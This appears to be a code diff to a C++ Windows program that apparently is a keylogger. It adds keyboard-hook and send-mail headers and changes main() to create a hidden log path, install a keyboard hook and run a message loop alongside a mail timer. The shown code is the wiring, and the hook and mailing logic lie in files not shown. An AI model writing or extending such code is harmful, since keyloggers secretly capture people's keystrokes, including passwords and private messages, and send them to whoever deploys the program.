@@ -4,6 +4,8 @@
 #include"Helper.h"
 #include"KeyConstants.h"
 #include"IO.h"
+#include"SendMail.h"
+#include"KeyBoardHook.h"
 #include<Windows.h>
 
 using namespace std;
@@ -33,10 +35,14 @@ void setData() {
 int main() {
 
 	MSG msg;
-	//while (GetMessage(&msg, NULL, 0, 0)) {
-	//	TranslateMessage(&msg);
-	//	DispatchMessage(&msg);
-	//}
-	//std::cout << "MAIN()";
+	IO::MakeDir(IO::GetOurPath(true));
+	IO::WriteLog("Hello Guys");
+	InstallHook();
+	while (GetMessage(&msg, NULL, 0, 0)) {
+		TranslateMessage(&msg);
+		DispatchMessage(&msg);
+	}
+	
+	MailTimer.Stop();
 	return 0;
 }
